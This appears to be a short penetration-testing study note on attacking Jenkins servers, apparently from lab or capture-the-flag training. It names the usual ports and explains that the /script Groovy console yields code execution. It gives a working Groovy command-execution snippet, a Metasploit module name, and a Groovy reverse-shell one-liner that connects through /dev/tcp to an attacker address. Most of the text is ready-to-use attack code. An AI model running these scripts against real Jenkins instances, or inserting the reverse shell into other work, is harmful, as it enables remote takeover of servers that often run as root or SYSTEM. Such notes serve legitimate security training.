Jenkins usually sit on Tomcat Port 8080, Port 5000 is for slave server, discovery usually comes from manual evaluation or nmap

Attacking Jenkins:

After gaining access to Jenkins, the quickest way to archive RCE is by using the script console, which is located at /script, it accept arbitrary Groovy scripts and can be abused to run OS commands.

The following scripts allow us to run a system command:
```
def cmd = 'id' #Change id to command we want
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

To gain a reverse shell (which is very lucrative as Jenkins usually sits on the context of root or SYSTEM, although their are exceptions), we can use the following metasploit module:
```
exploit/multi/http/jenkins_script_console 
```
Or script:
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```